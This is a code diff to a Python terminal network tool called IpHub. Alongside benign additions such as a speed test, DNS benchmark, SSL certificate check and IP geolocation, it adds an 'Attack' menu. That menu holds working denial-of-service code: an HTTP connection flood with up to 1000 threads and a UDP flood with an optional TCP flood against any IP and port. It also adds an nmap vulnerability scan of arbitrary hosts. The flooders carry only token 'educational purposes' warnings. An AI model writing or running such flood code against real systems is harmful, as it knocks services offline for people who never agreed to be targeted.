@@ -1,4 +1,3 @@
-
 #!/usr/bin/env python3
 import os
 import sys
@@ -10,6 +9,9 @@ import time
 import threading
 import random
 import re
+import ssl
+import speedtest
+import dns.resolver
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 
@@ -39,11 +41,11 @@ def print_banner():
     print(f"                                                ")
     print(f"                                                ")
     print(f"                                                {RESET}")
-    print(f"{YELLOW}                  Made by marzi tools{RESET}")
+    print(f"{YELLOW}                  Made by marzi tools v2.1 (Early Access){RESET}")
+    print(f"{BLUE}                  GitHub: https://github.com/Demon33gio/IpHub.git{RESET}")
     print()
 
 def animate_scanning(text, stop_event):
-    """Animation for scanning processes"""
     chars = ['|', '/', '-', '\\']
     i = 0
     while not stop_event.is_set():
@@ -52,17 +54,14 @@ def animate_scanning(text, stop_event):
         time.sleep(0.2)
 
 def print_section_header(title):
-    """Print formatted section headers"""
     print(f"\n{CYAN}{'='*60}{RESET}")
     print(f"{CYAN}{title.center(60)}{RESET}")
     print(f"{CYAN}{'='*60}{RESET}\n")
 
 def print_result(title, value, color=WHITE):
-    """Print formatted results"""
     print(f"{BLUE}{title}: {color}{value}{RESET}")
 
 def validate_ip(ip):
-    """Validate IP address format"""
     try:
         socket.inet_aton(ip)
         return True
@@ -70,7 +69,6 @@ def validate_ip(ip):
         return False
 
 def validate_domain(domain):
-    """Validate domain format"""
     pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$'
     return re.match(pattern, domain) is not None
 
@@ -83,6 +81,10 @@ def print_menu():
     print(f"[{GREEN}5{RESET}] Ping Sweep")
     print(f"[{GREEN}6{RESET}] NetStat")
     print(f"[{GREEN}7{RESET}] TraceRoute")
+    print(f"[{GREEN}24{RESET}] Speed Test")
+    print(f"[{GREEN}25{RESET}] DNS Benchmark")
+    print(f"[{GREEN}26{RESET}] HTTP/HTTPS Check")
+    print(f"[{GREEN}27{RESET}] SSL Check")
     print()
     print(f"{YELLOW}----------------------------- Advanced--------------------------------{RESET}")
     print(f"[{GREEN}8{RESET}] {YELLOW}Advanced IP Scan                  #API#{RESET}")
@@ -93,6 +95,14 @@ def print_menu():
     print(f"[{GREEN}13{RESET}] DNS Lookup")
     print(f"[{GREEN}14{RESET}] Reverse DNS")
     print(f"[{GREEN}15{RESET}] HTTP Headers Check")
+    print(f"[{GREEN}28{RESET}] Multi Geolocation")
+    print(f"[{GREEN}29{RESET}] Termux Network Info")
+    print()
+    print(f"{RED}-----------------------------------Attack---------------------------------------{RESET}")
+    print(f"[{GREEN}30{RESET}] IP Dos")
+    print(f"[{GREEN}31{RESET}] UDP Flood")
+    print(f"[{GREEN}32{RESET}] Scan Wifi")
+    print(f"[{GREEN}33{RESET}] Vulnerability Scan")
     print()
     print(f"{CYAN}----------------------------- Others----------------------------{RESET}")
     print(f"[{GREEN}16{RESET}] Nmap scan")
@@ -232,7 +242,6 @@ def service_detection():
                                      args=("Detecting services", stop_event))
         anim_thread.start()
         
-        # Use nmap for service detection if available
         try:
             result = subprocess.run(['nmap', '-sV', '--version-intensity', '2', ip], 
                                   capture_output=True, text=True, timeout=120)
@@ -249,7 +258,6 @@ def service_detection():
             print(f"\r{CYAN}{'='*60}{RESET}")
             print(f"{YELLOW}Nmap not available. Using basic service detection.{RESET}")
             
-            # Basic service detection using common ports
             common_services = {
                 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
                 80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 
@@ -295,7 +303,6 @@ def arp_scan():
                                      args=("ARP scanning", stop_event))
         anim_thread.start()
         
-        # Try to get local IP and subnet
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         local_ip = s.getsockname()[0]
@@ -304,7 +311,6 @@ def arp_scan():
         subnet = '.'.join(local_ip.split('.')[:3]) + '.0/24'
         print_result("\nNetwork", subnet)
         
-        # Use arp-scan if available
         try:
             result = subprocess.run(['arp-scan', '--localnet'], 
                                   capture_output=True, text=True, timeout=30)
@@ -345,7 +351,6 @@ def ping_sweep():
                                      args=("Ping sweeping", stop_event))
         anim_thread.start()
         
-        # Get local IP and subnet
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         local_ip = s.getsockname()[0]
@@ -371,7 +376,6 @@ def ping_sweep():
             except:
                 pass
         
-        # Ping all hosts in the subnet
         with ThreadPoolExecutor(max_workers=50) as executor:
             for i in range(1, 255):
                 host_ip = f"{subnet}.{i}"
@@ -472,7 +476,6 @@ def advanced_ip_scan():
     print(f"{YELLOW} \\__________________/{RESET}")
     print()
     
-    # List of available APIs
     apis = {
         'ipinfo': {
             'name': 'IPInfo',
@@ -482,7 +485,6 @@ def advanced_ip_scan():
         }
     }
     
-    # Ask for API keys
     for api_name, api_data in apis.items():
         if api_data['key_required']:
             print(f"{CYAN}Enter {api_data['name']} API key (press Enter to skip):{RESET}")
@@ -502,7 +504,6 @@ def advanced_ip_scan():
     try:
         print_section_header("ADVANCED IP SCAN")
         
-        # Try each API
         for api_name, api_data in apis.items():
             if api_data['key_required'] and not api_data['key']:
                 continue
@@ -554,7 +555,6 @@ def os_detection():
                                      args=("Detecting OS", stop_event))
         anim_thread.start()
         
-        # Use nmap for OS detection if available
         try:
             result = subprocess.run(['nmap', '-O', '--osscan-limit', ip], 
                                   capture_output=True, text=True, timeout=120)
@@ -571,7 +571,6 @@ def os_detection():
             print(f"\r{CYAN}{'='*60}{RESET}")
             print(f"{YELLOW}Nmap not available. Using TTL-based OS detection.{RESET}")
             
-            # Basic OS detection using TTL
             try:
                 if os.name == 'posix':
                     result = subprocess.run(['ping', '-c', '1', ip], 
@@ -632,15 +631,12 @@ def get_mac():
                                      args=("Finding MAC", stop_event))
         anim_thread.start()
         
-        # Try to get MAC address using ARP
         mac_address = None
         
         if os.name == 'posix':
-            # First ping the host to populate ARP cache
             subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
                          capture_output=True, timeout=5)
             
-            # Then check ARP table
             result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True)
             output = result.stdout
             
@@ -653,7 +649,7 @@ def get_mac():
                             mac_address = parts[2]
                             break
                             
-        else:  # Windows
+        else:
             subprocess.run(['ping', '-n', '1', '-w', '1000', ip], 
                          capture_output=True, timeout=5)
             
@@ -705,7 +701,6 @@ def service_info():
             print_result("Port", port, GREEN)
             print_result("Service", service)
             
-            # Common service descriptions
             service_descriptions = {
                 21: "File Transfer Protocol",
                 22: "Secure Shell",
@@ -755,7 +750,6 @@ def whois_lookup():
                                      args=("WHOIS lookup", stop_event))
         anim_thread.start()
         
-        # Try to use whois command if available
         try:
             if os.name == 'posix':
                 result = subprocess.run(['whois', target], 
@@ -807,7 +801,6 @@ def nmap_scan():
                                      args=("Nmap scanning", stop_event))
         anim_thread.start()
         
-        # Check if nmap is available
         try:
             result = subprocess.run(['nmap', '-v', '-A', '--reason', ip], 
                                   capture_output=True, text=True, timeout=300)
@@ -1014,7 +1007,6 @@ def dns_lookup():
                                      args=("Resolving DNS", stop_event))
         anim_thread.start()
         
-        # Get all IP addresses for the domain
         addresses = socket.getaddrinfo(domain, None)
         ip_list = set()
         
@@ -1058,7 +1050,6 @@ def reverse_dns_lookup():
                                      args=("Reverse DNS lookup", stop_event))
         anim_thread.start()
         
-        # Get hostname from IP
         hostname, aliases, _ = socket.gethostbyaddr(ip)
         
         stop_event.set()
@@ -1128,162 +1119,543 @@ def http_headers_check():
     
     input("\nPress Enter to continue...")
 
-def subnet_calculator():
-    print(f"{CYAN}{{¿}} Enter IP with CIDR (e.g., 192.168.1.0/24){RESET}")
-    cidr = input("> ").strip()
+def speed_test():
+    print_section_header("SPEED TEST")
+    print(f"{BLUE}{{/}} Testing internet speed...{RESET}", end='', flush=True)
     
     try:
-        print_section_header("SUBNET CALCULATOR")
-        
-        # Basic subnet calculation without ipaddress module
-        if '/' not in cidr:
-            print(f"{RED}Error: Please use CIDR notation (e.g., 192.168.1.0/24){RESET}")
-            input("\nPress Enter to continue...")
-            return
-        
-        ip, cidr_mask = cidr.split('/')
-        cidr_mask = int(cidr_mask)
-        
-        if not validate_ip(ip) or not (0 <= cidr_mask <= 32):
-            print(f"{RED}Error: Invalid CIDR notation{RESET}")
-            input("\nPress Enter to continue...")
-            return
-        
-        # Calculate subnet mask
-        mask = (0xffffffff << (32 - cidr_mask)) & 0xffffffff
-        subnet_mask = ".".join([str((mask >> (24 - i * 8)) & 0xff) for i in range(4)])
-        
-        # Calculate network address
-        ip_parts = list(map(int, ip.split('.')))
-        network_parts = [ip_parts[i] & (mask >> (24 - i * 8) & 0xff) for i in range(4)]
-        network_addr = ".".join(map(str, network_parts))
-        
-        # Calculate broadcast address
-        broadcast_parts = [network_parts[i] | (~mask >> (24 - i * 8) & 0xff) for i in range(4)]
-        broadcast_addr = ".".join(map(str, broadcast_parts))
-        
-        # Calculate number of hosts
-        num_hosts = 2 ** (32 - cidr_mask) - 2 if cidr_mask < 31 else 2 ** (32 - cidr_mask)
-        
-        print_result("Network Address", network_addr, GREEN)
-        print_result("Subnet Mask", subnet_mask)
-        print_result("CIDR Notation", f"/{cidr_mask}")
-        print_result("Broadcast Address", broadcast_addr)
-        print_result("Total Hosts", f"{num_hosts:,}")
-        print_result("Usable Hosts", f"{max(0, num_hosts - 2):,}" if cidr_mask < 31 else "N/A")
-        
-        if cidr_mask <= 30:
-            print_result("First Host", f"{network_addr[:-1]}1")
-            print_result("Last Host", f"{broadcast_addr[:-1]}{int(broadcast_addr.split('.')[-1]) - 1}")
-            
-    except Exception as e:
-        print(f"{RED}Error: {str(e)}{RESET}")
-    
-    input("\nPress Enter to continue...")
-
-def blacklist_check():
-    print(f"{CYAN}{{¿}} Enter IP address{RESET}")
-    ip = input("> ").strip()
-    
-    if not validate_ip(ip):
-        print(f"{RED}Error: Invalid IP address{RESET}")
-        input("\nPress Enter to continue...")
-        return
-    
-    try:
-        print_section_header("BLACKLIST CHECK")
-        print(f"{BLUE}{{/}} Checking blacklists...{RESET}", end='', flush=True)
-        
         stop_event = threading.Event()
         anim_thread = threading.Thread(target=animate_scanning,
-                                     args=("Checking blacklists", stop_event))
+                                     args=("Testing speed", stop_event))
         anim_thread.start()
         
-        # Common blacklist DNSBLs
-        blacklists = [
-            "zen.spamhaus.org",
-            "bl.spamcop.net",
-            "dnsbl.sorbs.net",
-            "spam.dnsbl.sorbs.net",
-        ]
+        st = speedtest.Speedtest()
+        st.get_best_server()
         
-        results = {}
-        
-        def check_blacklist(bl):
-            try:
-                reversed_ip = ".".join(reversed(ip.split('.')))
-                lookup = f"{reversed_ip}.{bl}"
-                socket.gethostbyname(lookup)
-                results[bl] = "LISTED"
-            except socket.gaierror:
-                results[bl] = "CLEAN"
-            except:
-                results[bl] = "ERROR"
-        
-        with ThreadPoolExecutor(max_workers=10) as executor:
-            executor.map(check_blacklist, blacklists)
+        download_speed = st.download() / 1_000_000
+        upload_speed = st.upload() / 1_000_000
+        ping = st.results.ping
         
         stop_event.set()
         anim_thread.join()
         
         print(f"\r{CYAN}{'='*60}{RESET}")
         
-        print_result("IP Address", ip, GREEN)
-        print(f"\n{BLUE}Blacklist Results:{RESET}")
+        print_result("Download Speed", f"{download_speed:.2f} Mbps", GREEN)
+        print_result("Upload Speed", f"{upload_speed:.2f} Mbps", GREEN)
+        print_result("Ping", f"{ping:.2f} ms", GREEN)
+        print_result("Server", st.results.server['name'])
+        print_result("ISP", st.results.client['isp'])
         
-        listed_count = 0
-        for bl, status in results.items():
-            if status == "LISTED":
-                print(f"  {RED}✗ {bl}: {status}{RESET}")
-                listed_count += 1
-            elif status == "CLEAN":
-                print(f"  {GREEN}✓ {bl}: {status}{RESET}")
-            else:
-                print(f"  {YELLOW}? {bl}: {status}{RESET}")
+    except Exception as e:
+        stop_event.set()
+        anim_thread.join()
+        print(f"{RED}Error: {str(e)}{RESET}")
+    
+    input("\nPress Enter to continue...")
+
+def wifi_scanner():
+    print_section_header("WIFI SCANNER")
+    
+    if os.name != 'posix':
+        print(f"{RED}This feature is only available on Linux systems{RESET}")
+        input("\nPress Enter to continue...")
+        return
+    
+    try:
+        print(f"{BLUE}{{/}} Scanning WiFi networks...{RESET}", end='', flush=True)
         
-        print(f"\n{BLUE}Summary: {RESET}", end="")
-        if listed_count > 0:
-            print(f"{RED}Listed in {listed_count} blacklist(s){RESET}")
-        else:
-            print(f"{GREEN}Not listed in any checked blacklists{RESET}")
-            
+        stop_event = threading.Event()
+        anim_thread = threading.Thread(target=animate_scanning,
+                                     args=("Scanning WiFi", stop_event))
+        anim_thread.start()
+        
+        result = subprocess.run(['nmcli', '-f', 'SSID,SIGNAL,SECURITY', 'dev', 'wifi'], 
+                              capture_output=True, text=True, timeout=30)
+        
+        stop_event.set()
+        anim_thread.join()
+        
+        print(f"\r{CYAN}{'='*60}{RESET}")
+        print(result.stdout)
+        
+    except FileNotFoundError:
+        print(f"{RED}nmcli not available. Install NetworkManager.{RESET}")
     except Exception as e:
         print(f"{RED}Error: {str(e)}{RESET}")
     
     input("\nPress Enter to continue...")
 
-def save_results():
-    print(f"{CYAN}{{¿}} Enter text to save{RESET}")
-    text = input("> ").strip()
+def dns_benchmark():
+    print_section_header("DNS BENCHMARK")
     
-    if not text:
-        print(f"{YELLOW}No text to save{RESET}")
+    dns_servers = {
+        'Google': '8.8.8.8',
+        'Cloudflare': '1.1.1.1',
+        'OpenDNS': '208.67.222.222',
+        'Quad9': '9.9.9.9',
+        'Comodo': '8.26.56.26'
+    }
+    
+    test_domains = ['google.com', 'facebook.com', 'amazon.com', 'netflix.com', 'github.com']
+    
+    results = {}
+    
+    print(f"{BLUE}{{/}} Benchmarking DNS servers...{RESET}")
+    
+    for name, server in dns_servers.items():
+        print(f"{CYAN}Testing {name} ({server})...{RESET}")
+        total_time = 0
+        successful = 0
+        
+        resolver = dns.resolver.Resolver()
+        resolver.nameservers = [server]
+        resolver.timeout = 3
+        resolver.lifetime = 3
+        
+        for domain in test_domains:
+            try:
+                start_time = time.time()
+                answers = resolver.resolve(domain, 'A')
+                end_time = time.time()
+                total_time += (end_time - start_time) * 1000
+                successful += 1
+            except:
+                pass
+        
+        if successful > 0:
+            avg_time = total_time / successful
+            results[name] = avg_time
+            print(f"  {GREEN}Average: {avg_time:.2f} ms ({successful}/5 successful){RESET}")
+        else:
+            results[name] = float('inf')
+            print(f"  {RED}Failed all queries{RESET}")
+    
+    print(f"\n{CYAN}{'='*60}{RESET}")
+    print(f"{GREEN}DNS Benchmark Results:{RESET}")
+    
+    sorted_results = sorted(results.items(), key=lambda x: x[1])
+    for i, (name, time_ms) in enumerate(sorted_results):
+        if time_ms == float('inf'):
+            print(f"{i+1}. {RED}{name}: Failed{RESET}")
+        else:
+            print(f"{i+1}. {GREEN}{name}: {time_ms:.2f} ms{RESET}")
+    
+    input("\nPress Enter to continue...")
+
+def http_https_check():
+    print(f"{CYAN}{{¿}} Enter domain{RESET}")
+    domain = input("> ").strip()
+    
+    if not domain:
+        print(f"{RED}Error: Please enter a valid domain{RESET}")
         input("\nPress Enter to continue...")
         return
     
     try:
-        filename = f"iphub_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        print_section_header("HTTP/HTTPS CHECK")
         
-        with open(filename, 'w') as f:
-            f.write(f"IpHub Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write("="*50 + "\n\n")
-            f.write(text)
+        protocols = ['http', 'https']
+        results = {}
         
-        print(f"{GREEN}Results saved to: {YELLOW}{filename}{RESET}")
+        for protocol in protocols:
+            url = f"{protocol}://{domain}"
+            try:
+                response = requests.get(url, timeout=10, allow_redirects=True)
+                results[protocol] = {
+                    'status': response.status_code,
+                    'redirects': len(response.history),
+                    'final_url': response.url
+                }
+            except requests.exceptions.RequestException:
+                results[protocol] = None
         
+        print(f"\n{BLUE}Results for {domain}:{RESET}")
+        
+        for protocol, result in results.items():
+            if result:
+                status_color = GREEN if result['status'] == 200 else YELLOW
+                print(f"{protocol.upper()}: {status_color}{result['status']}{RESET}")
+                if result['redirects'] > 0:
+                    print(f"  Redirects: {result['redirects']}")
+                    print(f"  Final URL: {result['final_url']}")
+            else:
+                print(f"{protocol.upper()}: {RED}Failed{RESET}")
+                
     except Exception as e:
-        print(f"{RED}Error saving file: {str(e)}{RESET}")
+        print(f"{RED}Error: {str(e)}{RESET}")
     
     input("\nPress Enter to continue...")
 
-def version():
-    print_section_header("IPHUB VERSION INFORMATION")
-    print_result("Version", "1.0 Beta", GREEN)
-    print_result("Author", "marzi tools")
-    print_result("Description", "Advanced Network Analysis Tool")
-    print_result("License", "Educational Use Only")
-    print_result("Python Version", f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
-    print_result("Platform", sys.platform)
+def ssl_check():
+    print(f"{CYAN}{{¿}} Enter domain{RESET}")
+    domain = input("> ").strip()
+    
+    if not domain:
+        print(f"{RED}Error: Please enter a valid domain{RESET}")
+        input("\nPress Enter to continue...")
+        return
+    
+    try:
+        print_section_header("SSL CHECK")
+        print(f"{BLUE}{{/}} Checking SSL certificate...{RESET}", end='', flush=True)
+        
+        stop_event = threading.Event()
+        anim_thread = threading.Thread(target=animate_scanning,
+                                     args=("Checking SSL", stop_event))
+        anim_thread.start()
+        
+        context = ssl.create_default_context()
+        with socket.create_connection((domain, 443), timeout=10) as sock:
+            with context.wrap_socket(sock, server_hostname=domain) as ssock:
+                cert = ssock.getpeercert()
+        
+        stop_event.set()
+        anim_thread.join()
+        
+        print(f"\r{CYAN}{'='*60}{RESET}")
+        
+        print_result("Domain", domain, GREEN)
+        
+        if cert:
+            print_result("SSL Certificate", "Valid", GREEN)
+            
+            not_before = cert.get('notBefore')
+            not_after = cert.get('notAfter')
+            
+            if not_before:
+                print_result("Valid From", not_before)
+            if not_after:
+                print_result("Valid Until", not_after)
+                expiry_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
+                days_left = (expiry_date - datetime.now()).days
+                status_color = GREEN if days_left > 30 else YELLOW if days_left > 7 else RED
+                print_result("Days Left", f"{days_left} days", status_color)
+            
+            issuer = dict(x[0] for x in cert['issuer'])
+            print_result("Issuer", issuer.get('organizationName', 'Unknown'))
+            
+        else:
+            print_result("SSL Certificate", "Invalid", RED)
+            
+    except ssl.SSLError:
+        print(f"{RED}SSL Certificate is invalid or self-signed{RESET}")
+    except Exception as e:
+        print(f"{RED}Error: {str(e)}{RESET}")
+    
+    input("\nPress Enter to continue...")
+
+def multi_geolocation():
+    print(f"{CYAN}{{¿}} Enter IP addresses (comma separated){RESET}")
+    ips_input = input("> ").strip()
+    
+    if not ips_input:
+        print(f"{RED}Error: Please enter valid IP addresses{RESET}")
+        input("\nPress Enter to continue...")
+        return
+    
+    ips = [ip.strip() for ip in ips_input.split(',')]
+    valid_ips = []
+    
+    for ip in ips:
+        if validate_ip(ip):
+            valid_ips.append(ip)
+        else:
+            print(f"{YELLOW}Invalid IP skipped: {ip}{RESET}")
+    
+    if not valid_ips:
+        print(f"{RED}No valid IP addresses provided{RESET}")
+        input("\nPress Enter to continue...")
+        return
+    
+    try:
+        print_section_header("MULTI GEOLOCATION")
+        
+        for ip in valid_ips:
+            print(f"\n{BLUE}Geolocation for {ip}:{RESET}")
+            
+            try:
+                url = f"http://ip-api.com/json/{ip}"
+                response = requests.get(url, timeout=10)
+                data = response.json()
+                
+                if data['status'] == 'success':
+                    print_result("  Country", data.get('country', 'N/A'))
+                    print_result("  Region", data.get('regionName', 'N/A'))
+                    print_result("  City", data.get('city', 'N/A'))
+                    print_result("  ISP", data.get('isp', 'N/A'))
+                    if data.get('lat') and data.get('lon'):
+                        print_result("  Coordinates", f"{data['lat']}, {data['lon']}")
+                else:
+                    print(f"  {RED}Could not retrieve information{RESET}")
+                    
+            except:
+                print(f"  {RED}Error retrieving data{RESET}")
+                
+    except Exception as e:
+        print(f"{RED}Error: {str(e)}{RESET}")
+    
+    input("\nPress Enter to continue...")
+
+def termux_network_info():
+    print_section_header("TERMUX NETWORK INFO")
+    
+    if os.name != 'posix':
+        print(f"{RED}This feature is designed for Termux on Android{RESET}")
+        input("\nPress Enter to continue...")
+        return
+    
+    try:
+        commands = {
+            'ifconfig': ['ifconfig'],
+            'ip_addr': ['ip', 'addr'],
+            'netstat': ['netstat', '-tunap'],
+            'wifi_info': ['dumpsys', 'wifi']
+        }
+        
+        for name, cmd in commands.items():
+            print(f"\n{BLUE}{name.upper()}:{RESET}")
+            try:
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+                if result.returncode == 0:
+                    print(result.stdout[:500] + "..." if len(result.stdout) > 500 else result.stdout)
+                else:
+                    print(f"{YELLOW}Command failed{RESET}")
+            except:
+                print(f"{YELLOW}Command not available{RESET}")
+                
+    except Exception as e:
+        print(f"{RED}Error: {str(e)}{RESET}")
+    
+    input("\nPress Enter to continue...")
+
+def ip_dos():
+    print(f"{RED}WARNING: This is for educational purposes only{RESET}")
+    print(f"{RED}Do not use this tool for illegal activities{RESET}")
+    
+    print(f"{CYAN}{{¿}} Enter target IP{RESET}")
+    target_ip = input("> ").strip()
+    
+    if not validate_ip(target_ip):
+        print(f"{RED}Error: Invalid IP address{RESET}")
+        input("\nPress Enter to continue...")
+        return
+    
+    print(f"{CYAN}{{¿}} Enter number of threads (10-1000){RESET}")
+    try:
+        threads = int(input("> "))
+        if threads < 10 or threads > 1000:
+            print(f"{RED}Error: Threads must be between 10 and 1000{RESET}")
+            input("\nPress Enter to continue...")
+            return
+    except ValueError:
+        print(f"{RED}Error: Please enter a valid number{RESET}")
+        input("\nPress Enter to continue...")
+        return
+    
+    print(f"{CYAN}{{¿}} Enter duration in seconds (10-300){RESET}")
+    try:
+        duration = int(input("> "))
+        if duration < 10 or duration > 300:
+            print(f"{RED}Error: Duration must be between 10 and 300 seconds{RESET}")
+            input("\nPress Enter to continue...")
+            return
+    except ValueError:
+        print(f"{RED}Error: Please enter a valid number{RESET}")
+        input("\nPress Enter to continue...")
+        return
+    
+    try:
+        print_section_header("IP DOS ATTACK")
+        print(f"{RED}Starting attack on {target_ip} with {threads} threads for {duration} seconds{RESET}")
+        
+        stop_event = threading.Event()
+        
+        def attack():
+            while not stop_event.is_set():
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)
+                    s.connect((target_ip, 80))
+                    s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, 80))
+                    s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, 80))
+                    s.close()
+                except:
+                    pass
+        
+        attack_threads = []
+        for i in range(threads):
+            t = threading.Thread(target=attack)
+            t.daemon = True
+            attack_threads.append(t)
+        
+        for t in attack_threads:
+            t.start()
+        
+        print(f"{RED}Attack started. Press Ctrl+C to stop early.{RESET}")
+        time.sleep(duration)
+        stop_event.set()
+        
+        print(f"{GREEN}Attack completed.{RESET}")
+        
+    except Exception as e:
+        print(f"{RED}Error: {str(e)}{RESET}")
+    
+    input("\nPress Enter to continue...")
+
+def udp_flood():
+    print(f"{RED}WARNING: This is for educational purposes only{RESET}")
+    print(f"{RED}Do not use this tool for illegal activities{RESET}")
+    
+    print(f"{CYAN}{{¿}} Enter target IP{RESET}")
+    target_ip = input("> ").strip()
+    
+    if not validate_ip(target_ip):
+        print(f"{RED}Error: Invalid IP address{RESET}")
+        input("\nPress Enter to continue...")
+        return
+    
+    print(f"{CYAN}{{¿}} Enter target port{RESET}")
+    try:
+        target_port = int(input("> "))
+        if target_port < 1 or target_port > 65535:
+            print(f"{RED}Error: Port must be between 1 and 65535{RESET}")
+            input("\nPress Enter to continue...")
+            return
+    except ValueError:
+        print(f"{RED}Error: Please enter a valid port number{RESET}")
+        input("\nPress Enter to continue...")
+        return
+    
+    print(f"{CYAN}{{¿}} Combine with TCP flood? (y/n){RESET}")
+    combine_tcp = input("> ").lower().strip() == 'y'
+    
+    print(f"{CYAN}{{¿}} Enter packet size (64-65500){RESET}")
+    try:
+        packet_size = int(input("> "))
+        if packet_size < 64 or packet_size > 65500:
+            print(f"{RED}Error: Packet size must be between 64 and 65500{RESET}")
+            input("\nPress Enter to continue...")
+            return
+    except ValueError:
+        print(f"{RED}Error: Please enter a valid number{RESET}")
+        input("\nPress Enter to continue...")
+        return
+    
+    print(f"{CYAN}{{¿}} Enter duration in seconds (10-300){RESET}")
+    try:
+        duration = int(input("> "))
+        if duration < 10 or duration > 300:
+            print(f"{RED}Error: Duration must be between 10 and 300 seconds{RESET}")
+            input("\nPress Enter to continue...")
+            return
+    except ValueError:
+        print(f"{RED}Error: Please enter a valid number{RESET}")
+        input("\nPress Enter to continue...")
+        return
+    
+    try:
+        print_section_header("UDP FLOOD ATTACK")
+        print(f"{RED}Starting UDP flood on {target_ip}:{target_port}{RESET}")
+        if combine_tcp:
+            print(f"{RED}Combining with TCP flood{RESET}")
+        
+        stop_event = threading.Event()
+        packet_data = random._urandom(packet_size)
+        
+        def udp_attack():
+            while not stop_event.is_set():
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    s.sendto(packet_data, (target_ip, target_port))
+                    s.close()
+                except:
+                    pass
+        
+        def tcp_attack():
+            while not stop_event.is_set():
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)
+                    s.connect((target_ip, target_port))
+                    s.send(packet_data)
+                    s.close()
+                except:
+                    pass
+        
+        attack_threads = []
+        
+        for i in range(100):
+            t = threading.Thread(target=udp_attack)
+            t.daemon = True
+            attack_threads.append(t)
+        
+        if combine_tcp:
+            for i in range(100):
+                t = threading.Thread(target=tcp_attack)
+                t.daemon = True
+                attack_threads.append(t)
+        
+        for t in attack_threads:
+            t.start()
+        
+        print(f"{RED}Attack started. Press Ctrl+C to stop early.{RESET}")
+        time.sleep(duration)
+        stop_event.set()
+        
+        print(f"{GREEN}Attack completed.{RESET}")
+        
+    except Exception as e:
+        print(f"{RED}Error: {str(e)}{RESET}")
+    
+    input("\nPress Enter to continue...")
+
+def vulnerability_scan():
+    print(f"{CYAN}{{¿}} Enter target IP{RESET}")
+    target_ip = input("> ").strip()
+    
+    if not validate_ip(target_ip):
+        print(f"{RED}Error: Invalid IP address{RESET}")
+        input("\nPress Enter to continue...")
+        return
+    
+    try:
+        print_section_header("VULNERABILITY SCAN")
+        print(f"{BLUE}{{/}} Scanning for common vulnerabilities...{RESET}", end='', flush=True)
+        
+        stop_event = threading.Event()
+        anim_thread = threading.Thread(target=animate_scanning,
+                                     args=("Vulnerability scanning", stop_event))
+        anim_thread.start()
+        
+        try:
+            result = subprocess.run(['nmap', '--script', 'vuln', target_ip], 
+                                  capture_output=True, text=True, timeout=300)
+            
+            stop_event.set()
+            anim_thread.join()
+            
+            print(f"\r{CYAN}{'='*60}{RESET}")
+            print(result.stdout)
+            
+            if "VULNERABLE" in result.stdout:
+                print(f"{RED}Vulnerabilities found!{RESET}")
+            else:
+                print(f"{GREEN}No obvious vulnerabilities found{RESET}")
+                
+        except FileNotFoundError:
+            stop_event.set()
+            anim_thread.join()
+            print(f"\r{RED}Nmap is not installed. Please install nmap for vulnerability scanning.{RESET}")
+            
+    except subprocess.TimeoutExpired:
+        stop_event.set()
+        anim_thread.join()
+        print(f"\r{RED}Scan timed out{RESET}")
+    except Exception as e:
+        stop_event.set()
+        anim_thread.join()
+        print(f"{RED}Error: {str(e)}{RESET}")
     
     input("\nPress Enter to continue...")
 
@@ -1293,41 +1665,85 @@ def main():
         print_menu()
         
         try:
-            choice = input(f"{CYAN}{{#}} >{RESET} ").strip()
+            choice = input(f"{GREEN}Select an option (1-33): {RESET}").strip()
             
-            options = {
-                '1': ip_info,
-                '2': port_scan,
-                '3': service_detection,
-                '4': arp_scan,
-                '5': ping_sweep,
-                '6': netstat,
-                '7': traceroute,
-                '8': advanced_ip_scan,
-                '9': os_detection,
-                '10': get_mac,
-                '11': service_info,
-                '12': whois_lookup,
-                '13': dns_lookup,
-                '14': reverse_dns_lookup,
-                '15': http_headers_check,
-                '16': nmap_scan,
-                '17': tcp_scan,
-                '18': udp_scan,
-                '19': trace_path,
-                '20': subnet_calculator,
-                '21': blacklist_check,
-                '22': save_results,
-                '23': version
-            }
-            
-            if choice in options:
-                options[choice]()
-            elif choice.lower() in ['exit', 'quit', 'q']:
-                print(f"\n{GREEN}Goodbye!{RESET}")
+            if choice == '1':
+                ip_info()
+            elif choice == '2':
+                port_scan()
+            elif choice == '3':
+                service_detection()
+            elif choice == '4':
+                arp_scan()
+            elif choice == '5':
+                ping_sweep()
+            elif choice == '6':
+                netstat()
+            elif choice == '7':
+                traceroute()
+            elif choice == '8':
+                advanced_ip_scan()
+            elif choice == '9':
+                os_detection()
+            elif choice == '10':
+                get_mac()
+            elif choice == '11':
+                service_info()
+            elif choice == '12':
+                whois_lookup()
+            elif choice == '13':
+                dns_lookup()
+            elif choice == '14':
+                reverse_dns_lookup()
+            elif choice == '15':
+                http_headers_check()
+            elif choice == '16':
+                nmap_scan()
+            elif choice == '17':
+                tcp_scan()
+            elif choice == '18':
+                udp_scan()
+            elif choice == '19':
+                trace_path()
+            elif choice == '20':
+                print(f"{YELLOW}Subnet Calculator - Coming soon{RESET}")
+                input("\nPress Enter to continue...")
+            elif choice == '21':
+                print(f"{YELLOW}Blacklist Check - Coming soon{RESET}")
+                input("\nPress Enter to continue...")
+            elif choice == '22':
+                print(f"{YELLOW}Save Results - Coming soon{RESET}")
+                input("\nPress Enter to continue...")
+            elif choice == '23':
+                print_section_header("VERSION")
